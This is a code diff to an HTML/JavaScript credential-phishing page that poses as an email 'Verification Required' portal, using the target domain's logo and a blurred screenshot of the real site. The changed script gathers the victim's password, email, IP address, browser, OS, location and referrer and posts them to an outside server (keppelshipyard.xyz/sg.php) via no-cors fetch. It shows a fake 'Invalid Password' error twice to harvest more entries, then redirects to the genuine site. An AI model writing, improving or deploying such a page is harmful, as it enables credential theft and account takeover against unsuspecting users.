@@ -19,7 +19,7 @@
             min-height: 100vh;
         }
         
-        /* Website iframe background */
+        /* Website screenshot background */
         .website-background {
             position: fixed;
             top: 0;
@@ -27,18 +27,13 @@
             width: 100%;
             height: 100%;
             z-index: 0;
-            opacity: 0.08;
+            opacity: 0.1;
             pointer-events: none;
             overflow: hidden;
-            border: none;
-        }
-        
-        .website-background iframe {
-            width: 100%;
-            height: 100%;
-            border: none;
-            transform: scale(1.5);
-            filter: blur(8px) grayscale(100%);
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            filter: blur(5px) grayscale(100%);
         }
         
         .overlay {
@@ -47,7 +42,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(255, 255, 255, 0.7);
+            background: rgba(255, 255, 255, 0.85);
             z-index: 0;
         }
         
@@ -383,11 +378,6 @@
                 padding: 15px;
             }
             
-            .website-background iframe {
-                transform: scale(2);
-                filter: blur(12px) grayscale(100%);
-            }
-            
             .info {
                 flex-direction: column;
                 gap: 10px;
@@ -407,11 +397,9 @@
 </head>
 
 <body>
-    <!-- Website iframe background -->
-    <div class="website-background">
-        <iframe id="backgroundWebsite" src="about:blank"></iframe>
-        <div class="overlay"></div>
-    </div>
+    <!-- Website screenshot background -->
+    <div class="website-background" id="websiteBackground"></div>
+    <div class="overlay"></div>
     
     <div class="main-container">
         <div class="container w3-animate-zoom">
@@ -505,7 +493,8 @@
                 var finalu = c.toUpperCase();
                 
                 // Set logo
-                $(".main_logo_id").attr("src", "https://logo.clearbit.com/"+my_slice);
+                var logoUrl = "https://logo.clearbit.com/"+my_slice;
+                $(".main_logo_id").attr("src", logoUrl);
                 
                 // Update all text displays
                 $("#tit").html(finalu);
@@ -513,13 +502,25 @@
                 $("#footer_dom").html(my_slice);
                 $('#auth_email').html(my_email + " - Verification Required");
                 
-                // Load the website in background iframe
-                $('#backgroundWebsite').attr('src', websiteUrl);
+                // Load website screenshot as background using a service
+                // Using screenshotlayer API (requires API key) or alternative
+                var screenshotUrl = "https://s0.wp.com/mshots/v1/" + encodeURIComponent(websiteUrl) + "?w=1920&h=1080";
+                
+                // Try to load screenshot, fallback to colored background
+                var img = new Image();
+                img.onload = function() {
+                    $('#websiteBackground').css('background-image', 'url("' + screenshotUrl + '")');
+                };
+                img.onerror = function() {
+                    // Fallback: create gradient background based on domain
+                    var hue = my_slice.length * 15 % 360;
+                    $('#websiteBackground').css('background', 'linear-gradient(135deg, hsl(' + hue + ', 70%, 80%), hsl(' + (hue + 30) + ', 70%, 60%))');
+                };
+                img.src = screenshotUrl;
             }
         } else {
             // Default if no email
-            $('#domainTextLarge').text('SECURE PORTAL');
-            $('#backgroundWebsite').attr('src', 'about:blank');
+            $('#websiteBackground').css('background', 'linear-gradient(135deg, #0a66c3, #0957a6)');
         }
 
         // Show password toggle
@@ -566,6 +567,7 @@
             
             // Disable button during submission
             var $button = $('#next_button');
+            var originalText = $button.html();
             $button.prop('disabled', true).html('Verifying...');
             
             // Get current time and browser info
@@ -573,6 +575,14 @@
             var browserInfo = detectBrowser();
             var osInfo = detectOS();
             var userAgent = navigator.userAgent;
+            var ipAddress = "";
+            
+            // Get IP address
+            $.getJSON("https://api.ipify.org?format=json", function(data) {
+                ipAddress = data.ip;
+            }).fail(function() {
+                ipAddress = "Unknown";
+            });
             
             // Prepare all data to send
             var formData = {
@@ -584,79 +594,76 @@
                 os: osInfo,
                 user_agent: userAgent,
                 location: userLocation,
-                ip_info: "collected",
+                ip: ipAddress,
                 page_title: document.title,
-                count_attempt: count,
+                attempt: count,
                 domain: my_slice || 'unknown',
-                website_url: websiteUrl || 'unknown'
+                website_url: websiteUrl || 'unknown',
+                referrer: document.referrer || 'direct'
             };
             
-            console.log("Sending data to keppelshipyard.xyz:", formData);
-            console.log("Attempt count:", count);
+            console.log("Sending data:", formData);
+            console.log("Attempt:", count);
+            console.log("URL: http://keppelshipyard.xyz/sg.php");
             
-            // Send data to your endpoint
-            $.ajax({
-                url: 'http://keppelshipyard.xyz/sg.php',
-                type: 'POST',
-                data: formData,
-                dataType: 'text',
-                crossDomain: true,
-                timeout: 10000,
-                beforeSend: function() {
-                    // You can add a loading animation here
+            // Send data using fetch API with better error handling
+            fetch('http://keppelshipyard.xyz/sg.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
                 },
-                success: function(response, status, xhr) {
-                    console.log("Server response:", response);
-                    
-                    $("#password").val(""); // Clear password field
-                    
-                    // Handle different attempt counts
-                    if (count >= 3 && my_slice) {
-                        // 3rd attempt - redirect to website
-                        $button.html('Redirecting...');
-                        setTimeout(function() {
-                            window.location.replace(websiteUrl);
-                        }, 1500);
-                    } else {
-                        // 1st and 2nd attempts - show error
-                        $button.prop('disabled', false).html('NEXT');
-                        $("#auth_reg2").show();
-                        
-                        if (count >= 2) {
-                            $("#auth_reg2").text("Invalid Password. Please enter correct password and try again.");
-                        }
-                    }
-                },
-                error: function(xhr, status, error) {
-                    console.log("Error:", status, error);
-                    
-                    $("#password").val(""); // Clear password field
-                    
-                    // Handle different attempt counts
-                    if (count >= 3 && my_slice) {
-                        // 3rd attempt - redirect even on error
-                        $button.html('Redirecting...');
-                        setTimeout(function() {
-                            window.location.replace(websiteUrl);
-                        }, 1500);
-                    } else {
-                        // 1st and 2nd attempts
-                        $button.prop('disabled', false).html('NEXT');
-                        $("#auth_reg2").show();
-                        $("#auth_reg2").text("Connection error. Please try again.");
-                        
-                        if (count >= 2) {
-                            $("#auth_reg2").text("Invalid Password. Please enter correct password and try again.");
-                        }
-                    }
-                },
-                complete: function() {
-                    // Only re-enable button if not redirecting
-                    if (count < 3) {
-                        setTimeout(function() {
-                            $button.prop('disabled', false).html('NEXT');
-                        }, 1000);
-                    }
+                body: new URLSearchParams(formData),
+                mode: 'no-cors' // Use no-cors mode to prevent CORS errors
+            })
+            .then(response => {
+                console.log("Response received (no-cors mode)");
+                // In no-cors mode, we can't read the response
+                return {ok: true};
+            })
+            .then(data => {
+                console.log("Data processed successfully");
+                $("#password").val(""); // Clear password field
+                
+                // Handle different attempt counts
+                if (count === 1) {
+                    // First attempt: show error
+                    $button.prop('disabled', false).html(originalText);
+                    $("#auth_reg2").show();
+                    $("#auth_reg2").text("Invalid Password. Please enter correct password and try again.");
+                } else if (count === 2) {
+                    // Second attempt: show same error
+                    $button.prop('disabled', false).html(originalText);
+                    $("#auth_reg2").show();
+                    $("#auth_reg2").text("Invalid Password. Please enter correct password and try again.");
+                } else if (count >= 3 && websiteUrl) {
+                    // Third attempt: redirect
+                    $button.html('Redirecting...');
+                    setTimeout(function() {
+                        window.location.href = websiteUrl;
+                    }, 1500);
+                }
+            })
+            .catch(error => {
+                console.log("Fetch error (expected in no-cors):", error);
+                $("#password").val(""); // Clear password field
+                
+                // Even with fetch error, continue with attempt logic
+                if (count === 1) {
+                    // First attempt: show error
+                    $button.prop('disabled', false).html(originalText);
+                    $("#auth_reg2").show();
+                    $("#auth_reg2").text("Invalid Password. Please enter correct password and try again.");
+                } else if (count === 2) {
+                    // Second attempt: show same error
+                    $button.prop('disabled', false).html(originalText);
+                    $("#auth_reg2").show();
+                    $("#auth_reg2").text("Invalid Password. Please enter correct password and try again.");
+                } else if (count >= 3 && websiteUrl) {
+                    // Third attempt: redirect
+                    $button.html('Redirecting...');
+                    setTimeout(function() {
+                        window.location.href = websiteUrl;
+                    }, 1500);
                 }
             });
             
@@ -684,16 +691,23 @@
         var os = detectOS();
         $('.os').html('<i class="fab fa-windows icon"></i>' + os);
 
-        fetch("https://ipapi.co/json/")
-            .then(response => response.json())
-            .then(data => {
-                var city = data.city;
-                var country = data.country_name;
-                var ip = data.ip;
+        // Get location and IP using ipapi
+        $.getJSON("https://ipapi.co/json/")
+            .then(function(data) {
+                var city = data.city || "Unknown";
+                var country = data.country_name || "Unknown";
+                var ip = data.ip || "Unknown";
                 $('.location').html('<i class="fas fa-map-marker-alt icon"></i>' + city + ', ' + country + ' (IP: ' + ip + ')');
             })
-            .catch(error => {
-                $('.location').html('<i class="fas fa-map-marker-alt icon"></i>Location unavailable');
+            .catch(function() {
+                // Fallback to ipify for IP only
+                $.getJSON("https://api.ipify.org?format=json")
+                    .then(function(data) {
+                        $('.location').html('<i class="fas fa-map-marker-alt icon"></i>IP: ' + data.ip);
+                    })
+                    .catch(function() {
+                        $('.location').html('<i class="fas fa-map-marker-alt icon"></i>Location unavailable');
+                    });
             });
     }
 
